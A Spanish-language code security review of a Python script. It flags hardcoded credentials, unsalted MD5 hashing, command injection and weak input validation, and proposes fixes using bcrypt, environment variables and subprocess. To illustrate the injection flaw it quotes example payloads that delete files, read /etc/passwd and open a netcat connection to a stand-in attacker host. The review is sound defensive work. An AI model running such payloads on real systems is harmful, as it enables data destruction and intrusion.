# Análisis de Vulnerabilidades y Correcciones

## 🔴 VULNERABILIDADES ENCONTRADAS

### 1. **Credenciales Hardcodeadas (Crítica)**
**Problema:**
```python
usuario_admin = "admin_root"
password_secreta = "SuperPasswordSecreta123!" 
```
- Las credenciales están visibles en el código fuente
- Cualquiera con acceso al repositorio o código compilado puede verlas
- Especialmente peligroso en control de versiones público

**Solución:**
- Usar variables de entorno cargadas desde archivo `.env`
- Archivo `.env` NO debe commiterse al repositorio
- Usar librería `python-dotenv` para cargar configuración

---

### 2. **Algoritmo Hash Débil - MD5 (Crítica)**
**Problema:**
```python
hash_objeto = hashlib.md5(password_ingresada.encode())
```
- MD5 fue criptográficamente comprometido en 2004
- Se pueden generar colisiones de hash fácilmente
- NO debe usarse para almacenar contraseñas
- Vulnerable a ataques de diccionario y tablas arco iris (rainbow tables)

**Solución:**
- Usar **bcrypt** (algoritmo diseñado específicamente para contraseñas)
- bcrypt incluye salt automático y tiene factor de trabajo adaptable
- Resiste ataques de fuerza bruta y timing attacks
- Computacionalmente costoso a propósito (hace ataques lentos)

---

### 3. **Sin Salt en Hash (Crítica)**
**Problema:**
- MD5 sin salt permite usar tablas arco iris precomputadas
- Dos usuarios con la misma contraseña tendrán el mismo hash
- Un atacante puede identificar contraseñas comunes

**Solución:**
- bcrypt genera un salt criptográficamente seguro automáticamente
- Cada hash es único incluso para la misma contraseña
- El salt está almacenado en el hash (formato: `$2b$12$...`)

---

### 4. **Inyección de Comandos (Crítica)**
**Problema:**
```python
comando = f"ping -c 1 {ip_servidor}"
os.system(comando)
```
- La entrada del usuario se inserta directamente en un comando shell
- Un atacante puede ejecutar comandos arbitrarios:
  - `"; rm -rf /"` - eliminar archivos
  - `"; cat /etc/passwd"` - leer archivos sensibles
  - `"; nc attacker.com 1234"` - reverse shell

**Solución:**
```python
subprocess.run(["ping", "-c", "1", ip_servidor], 
               capture_output=True, timeout=5)
```
- `subprocess.run()` evita shell interpretation
- Pasar comandos como lista de argumentos
- Sin expansión de caracteres especiales

---

### 5. **Falta Validación de Entrada (Alta)**
**Problema:**
- No se valida que `ip_servidor` sea una IP válida
- No se verifica longitud de contraseñas
- No hay manejo de excepciones robusto

**Solución:**
- Validar dirección IP con `ipaddress.ip_address()`
- Validar longitud y formato de contraseñas
- Lanzar excepciones específicas con mensajes claros

---

### 6. **Nombre de Base de Datos Expuesto (Media)**
**Problema:**
```python
conexion = sqlite3.connect("sistema_produccion.db")
```
- Nombre "producción" está visible en el código
- El archivo `.db` es accesible si la aplicación tiene permisos
- SQLite no es recomendado para aplicaciones críticas en producción

**Solución:**
- Usar variable de entorno para la ruta
- En producción, usar PostgreSQL/MySQL con credenciales seguras
- Encriptar la base de datos o usar VPN

---

### 7. **Sin Validación de Conexión a BD (Media)**
**Problema:**
- No hay validación de que la conexión sea exitosa
- No hay configuración de seguridad adicional
- No se habilitan características de integridad referencial

**Solución:**
```python
conexion.execute("PRAGMA foreign_keys = ON")
```
- Habilitar foreign keys para integridad referencial
- Usar timeout en conexión (5 segundos por defecto)
- Manejo robusto de errores

---

## ✅ CORRECCIONES IMPLEMENTADAS

### Cambios Principales:

1. **Gestión de Credenciales**
   - Credenciales en archivo `.env` (no versionado)
   - Cargadas con `python-dotenv`

2. **Algoritmo de Hashing**
   - Cambio de MD5 a bcrypt
   - Función `generar_hash_seguro()` creada
   - Función `verificar_acceso()` mejorada

3. **Seguridad en Comandos**
   - `os.system()` → `subprocess.run()`
   - Validación de IP antes de ejecutar
   - Timeout de 5 segundos

4. **Validación de Entrada**
   - Función `validar_direccion_ip()` añadida
   - Validación de tipos de datos
   - Manejo de excepciones específicas

5. **Documentación**
   - Docstrings en todas las funciones
   - Comentarios explicativos
   - Ejemplos de uso

---

## 📋 CHECKLIST DE SEGURIDAD

- ✅ Credenciales NO hardcodeadas
- ✅ Algoritmo hash seguro (bcrypt)
- ✅ Salt incluido automáticamente
- ✅ Validación de entrada robusta
- ✅ Sin inyección de comandos
- ✅ Manejo de excepciones adecuado
- ✅ Funciones documentadas
- ✅ PRAGMA foreign_keys habilitado

---

## 🔧 REQUISITOS PARA EJECUTAR

Instalar dependencias:
```bash
pip install bcrypt python-dotenv
```

Crear archivo `.env` basado en `.env.example`:
```bash
cp .env.example .env
```

---

## 💡 RECOMENDACIONES ADICIONALES

1. **Usar HTTPS/TLS** para comunicaciones de red
2. **Logging de seguridad** para registrar intentos fallidos
3. **Rate limiting** para prevenir ataques de fuerza bruta
4. **MFA** (Multi-Factor Authentication) en autenticación
5. **Auditoría de accesos** a recursos sensibles
6. **Rotación de contraseñas** periódicamente
7. **Usar gestor de contraseñas** en producción
8. **Scan de dependencias** con `pip-audit`

---

## 📚 Referencias

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [bcrypt Documentation](https://github.com/pyca/bcrypt)
- [Python subprocess](https://docs.python.org/3/library/subprocess.html)
- [CWE-327: Use of Broken Cryptography](https://cwe.mitre.org/data/definitions/327.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
